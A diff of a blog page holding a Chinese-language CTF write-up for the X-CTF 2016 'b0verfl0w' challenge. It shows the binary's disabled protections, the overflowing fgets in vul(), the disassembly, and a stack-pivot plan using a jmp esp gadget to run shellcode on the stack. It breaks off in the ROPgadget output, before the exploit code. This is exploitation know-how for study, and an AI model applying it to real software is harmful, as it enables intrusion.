@@ -1,13 +1,380 @@
-<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="X-CTF Quals 2016 - b0verfl0w"><meta name="keywords" content="stack pivoting"><meta name="author" content="Po1lux"><meta name="copyright" content="Po1lux"><title>X-CTF Quals 2016 - b0verfl0w | Po1lux's Diary</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  }
-} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看程序的安全保护，程序未开启NX"><span class="toc-number">1.</span> <span class="toc-text">查看程序的安全保护，程序未开启NX</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反汇编程序，源程序存在栈溢出漏洞"><span class="toc-number">2.</span> <span class="toc-text">反汇编程序，源程序存在栈溢出漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析汇编代码-fgets函数可以溢出0x28个字节的数据"><span class="toc-number">3.</span> <span class="toc-text">分析汇编代码,fgets函数可以溢出0x28个字节的数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#由于程序未开启NX，所以思路是在栈上布置shellcode，然后控制vul函数返回地址，即控制eip执行栈上的shellcode，栈上的布置如下："><span class="toc-number">4.</span> <span class="toc-text">由于程序未开启NX，所以思路是在栈上布置shellcode，然后控制vul函数返回地址，即控制eip执行栈上的shellcode，栈上的布置如下：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#通过ROPgadget，找到jmp-esp-gadgets的地址为0x08048504"><span class="toc-number">5.</span> <span class="toc-text">通过ROPgadget，找到jmp esp gadgets的地址为0x08048504</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">6.</span> <span class="toc-text">EXP</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://raw.githubusercontent.com/Po1lux/Po1lux.github.io/hexo/source/images/IMG.jpg"></div><div class="author-info__name text-center">Po1lux</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">56</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">28</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">8</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://raw.githubusercontent.com/Po1lux/Po1lux.github.io/hexo/source/images/IMG_3035.JPG)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Po1lux's Diary</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="post-info"><div id="post-title">X-CTF Quals 2016 - b0verfl0w</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-09-30</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/stack/">stack</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="&#x67E5;&#x770B;&#x7A0B;&#x5E8F;&#x7684;&#x5B89;&#x5168;&#x4FDD;&#x62A4;&#xFF0C;&#x7A0B;&#x5E8F;&#x672A;&#x5F00;&#x542F;NX"><a href="#&#x67E5;&#x770B;&#x7A0B;&#x5E8F;&#x7684;&#x5B89;&#x5168;&#x4FDD;&#x62A4;&#xFF0C;&#x7A0B;&#x5E8F;&#x672A;&#x5F00;&#x542F;NX" class="headerlink" title="&#x67E5;&#x770B;&#x7A0B;&#x5E8F;&#x7684;&#x5B89;&#x5168;&#x4FDD;&#x62A4;&#xFF0C;&#x7A0B;&#x5E8F;&#x672A;&#x5F00;&#x542F;NX"></a>&#x67E5;&#x770B;&#x7A0B;&#x5E8F;&#x7684;&#x5B89;&#x5168;&#x4FDD;&#x62A4;&#xFF0C;&#x7A0B;&#x5E8F;&#x672A;&#x5F00;&#x542F;NX</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CANARY    : <span class="type">disabled</span></span><br><span class="line">FORTIFY   : <span class="type">disabled</span></span><br><span class="line">NX        : <span class="type">disabled</span></span><br><span class="line">PIE       : <span class="type">disabled</span></span><br><span class="line">RELRO     : <span class="type">Partial</span></span><br></pre></td></tr></table></figure>
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="stack pivoting,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="&amp;#x67E5;&amp;#x770B;&amp;#x7A0B;&amp;#x5E8F;&amp;#x7684;&amp;#x5B89;&amp;#x5168;&amp;#x4FDD;&amp;#x62A4;&amp;#xFF0C;&amp;#x7A0B;&amp;#x5E8F;&amp;#x672A;&amp;#x5F00;&amp;#x542F;NX12345CANARY    : disabledFORTIFY   : disabledNX        : disabledPIE       : d">
+<meta name="keywords" content="stack pivoting">
+<meta property="og:type" content="article">
+<meta property="og:title" content="X-CTF Quals 2016 - b0verfl0w">
+<meta property="og:url" content="http://yoursite.com/2018/09/30/X-CTF-Quals-2016-b0verfl0w/index.html">
+<meta property="og:site_name" content="Po1lux&#39;s Diary">
+<meta property="og:description" content="&amp;#x67E5;&amp;#x770B;&amp;#x7A0B;&amp;#x5E8F;&amp;#x7684;&amp;#x5B89;&amp;#x5168;&amp;#x4FDD;&amp;#x62A4;&amp;#xFF0C;&amp;#x7A0B;&amp;#x5E8F;&amp;#x672A;&amp;#x5F00;&amp;#x542F;NX12345CANARY    : disabledFORTIFY   : disabledNX        : disabledPIE       : d">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-10-03T11:42:40.638Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="X-CTF Quals 2016 - b0verfl0w">
+<meta name="twitter:description" content="&amp;#x67E5;&amp;#x770B;&amp;#x7A0B;&amp;#x5E8F;&amp;#x7684;&amp;#x5B89;&amp;#x5168;&amp;#x4FDD;&amp;#x62A4;&amp;#xFF0C;&amp;#x7A0B;&amp;#x5E8F;&amp;#x672A;&amp;#x5F00;&amp;#x542F;NX12345CANARY    : disabledFORTIFY   : disabledNX        : disabledPIE       : d">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/30/X-CTF-Quals-2016-b0verfl0w/">
+
+
+
+
+
+
+  <title>X-CTF Quals 2016 - b0verfl0w | Po1lux's Diary</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Po1lux's Diary</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/30/X-CTF-Quals-2016-b0verfl0w/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Po1lux">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/IMG.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Po1lux's Diary">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">X-CTF Quals 2016 - b0verfl0w</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-30T10:49:33+08:00">
+                2018-09-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/stack/" itemprop="url" rel="index">
+                    <span itemprop="name">stack</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/09/30/X-CTF-Quals-2016-b0verfl0w/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/09/30/X-CTF-Quals-2016-b0verfl0w/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2018/09/30/X-CTF-Quals-2016-b0verfl0w/" class="leancloud_visitors" data-flag-title="X-CTF Quals 2016 - b0verfl0w">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="&#x67E5;&#x770B;&#x7A0B;&#x5E8F;&#x7684;&#x5B89;&#x5168;&#x4FDD;&#x62A4;&#xFF0C;&#x7A0B;&#x5E8F;&#x672A;&#x5F00;&#x542F;NX"><a href="#&#x67E5;&#x770B;&#x7A0B;&#x5E8F;&#x7684;&#x5B89;&#x5168;&#x4FDD;&#x62A4;&#xFF0C;&#x7A0B;&#x5E8F;&#x672A;&#x5F00;&#x542F;NX" class="headerlink" title="&#x67E5;&#x770B;&#x7A0B;&#x5E8F;&#x7684;&#x5B89;&#x5168;&#x4FDD;&#x62A4;&#xFF0C;&#x7A0B;&#x5E8F;&#x672A;&#x5F00;&#x542F;NX"></a>&#x67E5;&#x770B;&#x7A0B;&#x5E8F;&#x7684;&#x5B89;&#x5168;&#x4FDD;&#x62A4;&#xFF0C;&#x7A0B;&#x5E8F;&#x672A;&#x5F00;&#x542F;NX</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CANARY    : <span class="type">disabled</span></span><br><span class="line">FORTIFY   : <span class="type">disabled</span></span><br><span class="line">NX        : <span class="type">disabled</span></span><br><span class="line">PIE       : <span class="type">disabled</span></span><br><span class="line">RELRO     : <span class="type">Partial</span></span><br></pre></td></tr></table></figure>
 <h2 id="&#x53CD;&#x6C47;&#x7F16;&#x7A0B;&#x5E8F;&#xFF0C;&#x6E90;&#x7A0B;&#x5E8F;&#x5B58;&#x5728;&#x6808;&#x6EA2;&#x51FA;&#x6F0F;&#x6D1E;"><a href="#&#x53CD;&#x6C47;&#x7F16;&#x7A0B;&#x5E8F;&#xFF0C;&#x6E90;&#x7A0B;&#x5E8F;&#x5B58;&#x5728;&#x6808;&#x6EA2;&#x51FA;&#x6F0F;&#x6D1E;" class="headerlink" title="&#x53CD;&#x6C47;&#x7F16;&#x7A0B;&#x5E8F;&#xFF0C;&#x6E90;&#x7A0B;&#x5E8F;&#x5B58;&#x5728;&#x6808;&#x6EA2;&#x51FA;&#x6F0F;&#x6D1E;"></a>&#x53CD;&#x6C47;&#x7F16;&#x7A0B;&#x5E8F;&#xFF0C;&#x6E90;&#x7A0B;&#x5E8F;&#x5B58;&#x5728;&#x6808;&#x6EA2;&#x51FA;&#x6F0F;&#x6D1E;</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&apos;s your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s.&quot;</span>, &amp;s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
 <h2 id="&#x5206;&#x6790;&#x6C47;&#x7F16;&#x4EE3;&#x7801;-fgets&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x6EA2;&#x51FA;0x28&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x6570;&#x636E;"><a href="#&#x5206;&#x6790;&#x6C47;&#x7F16;&#x4EE3;&#x7801;-fgets&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x6EA2;&#x51FA;0x28&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x6570;&#x636E;" class="headerlink" title="&#x5206;&#x6790;&#x6C47;&#x7F16;&#x4EE3;&#x7801;,fgets&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x6EA2;&#x51FA;0x28&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x6570;&#x636E;"></a>&#x5206;&#x6790;&#x6C47;&#x7F16;&#x4EE3;&#x7801;,fgets&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x6EA2;&#x51FA;0x28&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x6570;&#x636E;</h2><p>&#x6211;&#x7684;&#x7406;&#x89E3;&#x662F;&#x770B;<code>call    _fgets</code>&#x8FD9;&#x4E2A;call&#x4E0A;&#x9762;&#x7684;&#x53C2;&#x6570;&#xFF0C;<code>lea     eax, [ebp+s]</code>ebp&#x52A0;&#x4E0A;&#x5199;&#x5165;&#x5730;&#x5740;s&#x7684;&#x504F;&#x79FB;&#x540E;&#x5C06;&#x8BE5;&#x5730;&#x5740;&#x4F20;&#x7ED9;eax&#xFF0C;&#x503C;&#x4E3A;[ebp-0x20]&#xFF0C;<code>mov     [esp], eax</code>&#x8FD9;&#x53E5;&#x4EE3;&#x7801;&#x5C06;&#x4E0A;&#x8FF0;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x4F20;&#x9012;&#x7ED9;esp&#xFF0C;&#x73B0;&#x5728;&#x6808;&#x6307;&#x9488;&#x6307;&#x5411;&#x7684;&#x662F;s&#x7684;&#x5177;&#x4F53;&#x5730;&#x5740;&#xFF0C;&#x8FD9;&#x4E2A;&#x5730;&#x5740;&#x5230;ebp&#x7684;&#x8DDD;&#x79BB;&#x4E3A;0x20&#x5404;&#x5B57;&#x8282;&#xFF0C;&#x6240;&#x4EE5;&#x6700;&#x591A;&#x53EF;&#x4EE5;&#x6EA2;&#x51FA;0x28&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x6570;&#x636E;</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0804851B vul             proc <span class="built_in">near</span>               <span class="comment">; CODE XREF: main+6&#x2191;p</span></span><br><span class="line"><span class="symbol">.text:</span>0804851B</span><br><span class="line"><span class="symbol">.text:</span>0804851B s               = <span class="built_in">byte</span> <span class="built_in">ptr</span> -<span class="number">20h</span></span><br><span class="line"><span class="symbol">.text:</span>0804851B</span><br><span class="line"><span class="symbol">.text:</span>0804851B <span class="comment">; __unwind {</span></span><br><span class="line"><span class="symbol">.text:</span>0804851B                 <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span>0804851C                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="symbol">.text:</span>0804851E                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">38h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048521</span>                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>], offset s <span class="comment">; &quot;\n======================&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048528</span>                 <span class="keyword">call</span>    _puts</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0804852D</span>                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>], offset aWelcomeToXCtf2 <span class="comment">; &quot;\nWelcome to X-CTF 2016!&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048534</span>                 <span class="keyword">call</span>    _puts</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048539</span>                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>], offset s <span class="comment">; &quot;\n======================&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048540</span>                 <span class="keyword">call</span>    _puts</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048545</span>                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>], offset aWhatSYourName <span class="comment">; &quot;What&apos;s your name?&quot;</span></span><br><span class="line"><span class="symbol">.text:</span>0804854C                 <span class="keyword">call</span>    _puts</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048551</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">ds</span>:stdout@@GLIBC_2_0</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048556</span>                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>], <span class="built_in">eax</span>      <span class="comment">; stream</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048559</span>                 <span class="keyword">call</span>    _fflush</span><br><span class="line"><span class="symbol">.text:</span>0804855E                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">ds</span>:stdin@@GLIBC_2_0</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048563</span>                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">8</span>], <span class="built_in">eax</span>    <span class="comment">; stream</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048567</span>                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">4</span>], <span class="number">32h</span> <span class="comment">; n</span></span><br><span class="line"><span class="symbol">.text:</span>0804856F                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+s]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048572</span>                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>], <span class="built_in">eax</span>      <span class="comment">; s</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048575</span>                 <span class="keyword">call</span>    _fgets</span><br><span class="line"><span class="symbol">.text:</span>0804857A                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+s]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0804857D</span>                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">4</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048581</span>                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>], offset format <span class="comment">; &quot;Hello %s.&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048588</span>                 <span class="keyword">call</span>    _printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0804858D</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">ds</span>:stdout@@GLIBC_2_0</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048592</span>                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>], <span class="built_in">eax</span>      <span class="comment">; stream</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048595</span>                 <span class="keyword">call</span>    _fflush</span><br><span class="line"><span class="symbol">.text:</span>0804859A                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0804859F                 <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">.text:</span>080485A0                 <span class="keyword">retn</span></span><br></pre></td></tr></table></figure>
@@ -17,7 +384,532 @@
 <p>0x08048504&#x4E3A;jmp esp &#x7684;gadgets&#xFF0C;&#x8986;&#x76D6;&#x4E86;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#xFF0C;&#x5F53;&#x7A0B;&#x5E8F;&#x6267;&#x884C;&#x5230;ret&#x65F6;&#xFF0C;&#x5C06;&#x8BE5;&#x5730;&#x5740;pop&#x7ED9;eip&#xFF0C;&#x5E76;&#x4E14;esp&#x4F1A;&#x52A0;4&#x6307;&#x5411;<code>asm(sub esp,0x28;jmp esp)</code>,&#x7136;&#x540E;eip&#x6267;&#x884C;&#x5730;&#x5740;0x08048504&#x4E0A;&#x7684;&#x4EE3;&#x7801;<code>jmp esp</code>&#xFF0C;eip&#x53C8;&#x4F1A;&#x6267;&#x884C;esp&#x6307;&#x5411;&#x7684;<code>sub esp,0x28;jmp esp</code>&#xFF0C;&#x5B8C;&#x6210;esp&#x7684;&#x52AB;&#x6301;&#x3002;&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;eip&#x6307;&#x5411;&#x7684;&#x662F;.text&#x6BB5;&#x4E2D;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x5C06;<code>sub esp,0x28;jmp esp</code>&#x8F6C;&#x5316;&#x4E3A;&#x673A;&#x5668;&#x7801;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x673A;&#x5668;&#x7801;</p>
 <h2 id="&#x901A;&#x8FC7;ROPgadget&#xFF0C;&#x627E;&#x5230;jmp-esp-gadgets&#x7684;&#x5730;&#x5740;&#x4E3A;0x08048504"><a href="#&#x901A;&#x8FC7;ROPgadget&#xFF0C;&#x627E;&#x5230;jmp-esp-gadgets&#x7684;&#x5730;&#x5740;&#x4E3A;0x08048504" class="headerlink" title="&#x901A;&#x8FC7;ROPgadget&#xFF0C;&#x627E;&#x5230;jmp esp gadgets&#x7684;&#x5730;&#x5740;&#x4E3A;0x08048504"></a>&#x901A;&#x8FC7;ROPgadget&#xFF0C;&#x627E;&#x5230;jmp esp gadgets&#x7684;&#x5730;&#x5740;&#x4E3A;0x08048504</h2><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary b0verfl0w --only <span class="emphasis">&apos;jmp|ret&apos;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08048504 